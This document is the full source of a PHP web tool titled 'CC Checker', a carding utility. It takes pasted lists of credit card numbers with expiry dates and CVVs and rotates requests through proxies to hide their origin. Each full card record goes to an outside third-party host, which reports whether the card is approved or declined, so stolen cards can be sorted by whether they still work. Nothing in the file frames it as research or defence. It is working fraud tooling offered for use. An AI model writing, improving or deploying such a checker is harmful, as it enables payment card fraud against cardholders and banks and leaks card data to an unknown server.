<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');

function checkCC($cc, $proxy = null) {
    $apiUrl = "http://garrry.whf.bz/qwerm.php/?lista=" . urlencode($cc);
    
    $options = [
        'http' => [
            'method' => 'GET',
            'timeout' => 30,
        ]
    ];
    
    // Add proxy if provided
    if ($proxy) {
        $proxyParts = explode(':', $proxy);
        if (count($proxyParts) == 2) {
            // IP:PORT format
            $options['http']['proxy'] = 'tcp://' . $proxy;
            $options['http']['request_fulluri'] = true;
        } elseif (count($proxyParts) == 4) {
            // IP:PORT:USER:PASS format
            $auth = base64_encode($proxyParts[2] . ':' . $proxyParts[3]);
            $options['http']['proxy'] = 'tcp://' . $proxyParts[0] . ':' . $proxyParts[1];
            $options['http']['request_fulluri'] = true;
            $options['http']['header'] = "Proxy-Authorization: Basic $auth\r\n";
        }
    }
    
    $context = stream_context_create($options);
    $startTime = microtime(true);
    
    try {
        $response = file_get_contents($apiUrl, false, $context);
        $processTime = round(microtime(true) - $startTime, 2);
        
        if ($response === false) {
            return [
                'status' => 'error', 
                'message' => 'API request failed',
                'time' => $processTime
            ];
        }
        
        // Parse the API response
        $responseData = json_decode($response, true);
        
        if (isset($responseData['Status']) && stripos($responseData['Response'], 'Approved') !== false) {
            return [
                'status' => 'live', 
                'message' => $responseData['Response'],
                'response' => $responseData['Response'] ?? '',
                'time' => $responseData['Time'] ?? $processTime
            ];
        } else {
            return [
                'status' => 'dead', 
                'message' => $responseData['Response'] ?? 'Declined',
                'response' => $responseData['Response'] ?? '',
                'time' => $responseData['Time'] ?? $processTime
            ];
        }
    } catch (Exception $e) {
        return [
            'status' => 'error', 
            'message' => $e->getMessage(),
            'time' => round(microtime(true) - $startTime, 2)
        ];
    }
}

// Handle AJAX check request
if (isset($_POST['action']) && $_POST['action'] == 'check_cc') {
    $cc = isset($_POST['cc']) ? trim($_POST['cc']) : '';
    $proxy = isset($_POST['proxy']) ? trim($_POST['proxy']) : null;
    
    if (empty($cc)) {
        echo json_encode(['status' => 'error', 'message' => 'No CC provided']);
        exit;
    }
    
    $result = checkCC($cc, $proxy);
    echo json_encode($result);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CC Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            min-height: 150px;
            font-family: monospace;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            display: block;
            margin: 20px auto;
            transition: background 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .note {
            font-size: 14px;
            color: #666;
            margin-top: 5px;
        }
        #results {
            margin-top: 30px;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }
        .result-item {
            padding: 12px;
            margin-bottom: 8px;
            border-radius: 4px;
            font-family: monospace;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .live {
            background-color: #e8f5e9;
            border-left: 4px solid #4CAF50;
        }
        .dead {
            background-color: #ffebee;
            border-left: 4px solid #f44336;
        }
        .error {
            background-color: #fff8e1;
            border-left: 4px solid #ffc107;
        }
        .checking {
            background-color: #e3f2fd;
            border-left: 4px solid #2196F3;
        }
        .cc-number {
            font-weight: bold;
            width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .status {
            margin-left: 15px;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 14px;
        }
        .status-checking {
            background-color: #bbdefb;
            color: #0d47a1;
        }
        .status-live {
            background-color: #c8e6c9;
            color: #2e7d32;
        }
        .status-dead {
            background-color: #ffcdd2;
            color: #c62828;
        }
        .status-error {
            background-color: #fff9c4;
            color: #f57f17;
        }
        .response-details {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            text-align: right;
        }
        .response-time {
            font-size: 12px;
            color: #666;
            margin-top: 3px;
        }
        .progress-container {
            margin: 20px 0;
            display: none;
        }
        .progress-text {
            text-align: center;
            margin-bottom: 5px;
            font-weight: bold;
        }
        #stopBtn {
            background-color: #f44336;
            margin-left: 10px;
        }
        #stopBtn:hover {
            background-color: #d32f2f;
        }
        .button-container {
            display: flex;
            justify-content: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CC Checker</h1>
        <form id="checkerForm">
            <div class="form-group">
                <label for="cc_list">Credit Cards (one per line)</label>
                <textarea name="cc_list" id="cc_list" placeholder="4111111111111111|12|25|123&#10;5111111111111118|05|24|456" required></textarea>
                <div class="note">Format: CCNUMBER|MM|YY|CVV</div>
            </div>
            
            <div class="form-group">
                <label for="proxy_list">Proxies (optional, one per line)</label>
                <textarea name="proxy_list" id="proxy_list" placeholder="127.0.0.1:8080&#10;proxy.example.com:3128:username:password"></textarea>
                <div class="note">Formats: IP:PORT or IP:PORT:USER:PASS</div>
            </div>
            
            <div class="button-container">
                <button type="button" id="checkBtn">Check Cards</button>
                <button type="button" id="stopBtn" disabled>Stop Checking</button>
            </div>
            
            <div class="progress-container" id="progressContainer">
                <div class="progress-text" id="progressText">Checking: 0/0</div>
                <progress id="progressBar" value="0" max="100"></progress>
            </div>
        </form>
        
        <div id="results"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const checkBtn = document.getElementById('checkBtn');
            const stopBtn = document.getElementById('stopBtn');
            const ccList = document.getElementById('cc_list');
            const proxyList = document.getElementById('proxy_list');
            const resultsDiv = document.getElementById('results');
            const progressContainer = document.getElementById('progressContainer');
            const progressText = document.getElementById('progressText');
            const progressBar = document.getElementById('progressBar');
            
            let checking = false;
            let currentIndex = 0;
            let ccArray = [];
            let proxyArray = [];
            let totalCards = 0;
            let stopRequested = false;
            
            checkBtn.addEventListener('click', startChecking);
            stopBtn.addEventListener('click', stopChecking);
            
            function startChecking() {
                if (checking) return;
                
                // Reset state
                resultsDiv.innerHTML = '';
                currentIndex = 0;
                stopRequested = false;
                
                // Get CCs and proxies
                ccArray = ccList.value.split('\n').filter(cc => cc.trim() !== '');
                proxyArray = proxyList.value.split('\n').filter(proxy => proxy.trim() !== '');
                totalCards = ccArray.length;
                
                if (totalCards === 0) {
                    alert('Please enter at least one credit card');
                    return;
                }
                
                // Update UI
                checking = true;
                checkBtn.disabled = true;
                stopBtn.disabled = false;
                progressContainer.style.display = 'block';
                updateProgress(0);
                
                // Start checking
                checkNextCard();
            }
            
            function stopChecking() {
                stopRequested = true;
                checking = false;
                checkBtn.disabled = false;
                stopBtn.disabled = true;
            }
            
            function checkNextCard() {
                if (stopRequested || currentIndex >= ccArray.length) {
                    // Finished or stopped
                    checking = false;
                    checkBtn.disabled = false;
                    stopBtn.disabled = true;
                    return;
                }
                
                const cc = ccArray[currentIndex].trim();
                const proxy = proxyArray[currentIndex % proxyArray.length]?.trim() || null;
                
                // Add checking status to UI
                const resultItem = document.createElement('div');
                resultItem.className = 'result-item checking';
                resultItem.innerHTML = `
                    <span class="cc-number">${cc}</span>
                    <div class="response-details">
                        <span class="status status-checking">Checking...</span>
                        <span class="response-time">-</span>
                    </div>
                `;
                resultsDiv.appendChild(resultItem);
                resultItem.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                
                // Update progress
                updateProgress(currentIndex + 1);
                
                // Send AJAX request
                const formData = new FormData();
                formData.append('action', 'check_cc');
                formData.append('cc', cc);
                if (proxy) formData.append('proxy', proxy);
                
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    // Update result in UI
                    let statusClass, statusText;
                    if (data.status === 'live') {
                        statusClass = 'live';
                        statusText = 'Approved';
                    } else if (data.status === 'dead') {
                        statusClass = 'dead';
                        statusText = 'Declined';
                    } else {
                        statusClass = 'error';
                        statusText = 'Error';
                    }
                    
                    resultItem.className = `result-item ${statusClass}`;
                    resultItem.innerHTML = `
                        <span class="cc-number">${cc}</span>
                        <div class="response-details">
                            <span class="status status-${statusClass}">${statusText}</span>
                            <span>${data.message}</span>
                            <span class="response-time">${data.time}s</span>
                        </div>
                    `;
                    
                    // Move to next card
                    currentIndex++;
                    setTimeout(checkNextCard, 3000); // Small delay between requests
                })
                .catch(error => {
                    resultItem.className = 'result-item error';
                    resultItem.innerHTML = `
                        <span class="cc-number">${cc}</span>
                        <div class="response-details">
                            <span class="status status-error">Error</span>
                            <span>${error.message}</span>
                            <span class="response-time">${data?.time || '0'}s</span>
                        </div>
                    `;
                    
                    currentIndex++;
                    setTimeout(checkNextCard, 300);
                });
            }
            
            function updateProgress(processed) {
                const percent = Math.round((processed / totalCards) * 100);
                progressText.textContent = `Checking: ${processed}/${totalCards}`;
                progressBar.value = percent;
            }
        });
    </script>
</body>
</html>